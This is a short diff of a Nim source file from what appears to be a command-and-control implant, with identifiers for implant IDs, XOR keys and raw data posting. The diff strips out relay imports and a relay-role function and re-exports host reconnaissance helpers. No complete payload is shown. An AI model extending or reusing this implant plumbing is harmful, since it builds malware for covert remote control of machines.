@@ -13,35 +13,12 @@ from core/webClientListener import getStoredImplantID, storeImplantID, postRawDa
 from config/configParser import parseConfig, INITIAL_XOR_KEY
 import util/[strenc, sysinfo, crypto]
 import core/cmdParser
-import core/relay/[relay_protocol, relay_comm, relay_config]
-import modules/relay/relay_commands
-# Import the global relay server from relay_commands to avoid conflicts
-from modules/relay/relay_commands import g_relayServer, getConnectionStats, broadcastMessage, sendToClient, getConnectedClients
-# Removed unused threadpool and locks imports
-
-# Import relay state from relay_commands module - NOW USING SAFE FUNCTIONS
-export isRelayServer, relayServerPort, upstreamRelay
-# Import isConnectedToRelay from relay_comm module
-from core/relay/relay_comm import isConnectedToRelay
-export isConnectedToRelay
+# Old relay system removed - will be replaced with simple HTTP relay
 
 # Re-export system info functions for compatibility
 export getLocalIP, getUsername, getSysHostname, getOSInfo, getCurrentPID, getCurrentProcessName
 
-# Function to determine relay role based on compilation parameters
-proc determineRelayRole*(): string =
-    const RELAY_ADDR {.strdefine.}: string = ""
-    
-    if RELAY_ADDR != "" and RELAY_ADDR.startsWith("relay://"):
-        when defined debug:
-            echo "[DEBUG] 🔍 Relay role determination: RELAY_CLIENT (RELAY_ADDRESS=" & RELAY_ADDR & ")"
-        return "RELAY_CLIENT"
-    else:
-        when defined debug:
-            echo "[DEBUG] 🔍 Relay role determination: STANDARD (no RELAY_ADDRESS)"
-        return "STANDARD"
-
-# ALL RELAY SERVER FUNCTIONS MOVED TO relay_commands.nim - USING SAFE PROTOCOL!
+# Relay functionality will be reimplemented with simple HTTP forwarding
 
 # Simple async communication queues (no locks needed in single-thread async)
 type
